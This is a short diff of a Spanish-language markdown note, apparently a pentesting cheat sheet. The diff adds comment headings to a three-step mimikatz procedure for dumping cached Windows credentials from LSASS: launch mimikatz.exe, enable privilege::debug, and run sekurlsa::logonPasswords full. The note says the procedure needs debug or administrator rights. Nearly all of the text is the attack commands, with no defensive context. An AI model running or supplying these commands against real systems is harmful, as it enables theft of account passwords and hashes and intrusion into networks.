@@ -1,11 +1,11 @@
 ## Solo va a funcionar si el user tiene permisos de debug o es un superusuario
 
 ### Dumpear credenciales en cache con mimikatz 
+##### Llamamos a mimikatz
     mimikatz.exe
-
+##### cargamos los permisos
     privilege::debug
-
-
+##### Dumpeamos la lsass
     sekurlsa::logonPasswords full
 
 
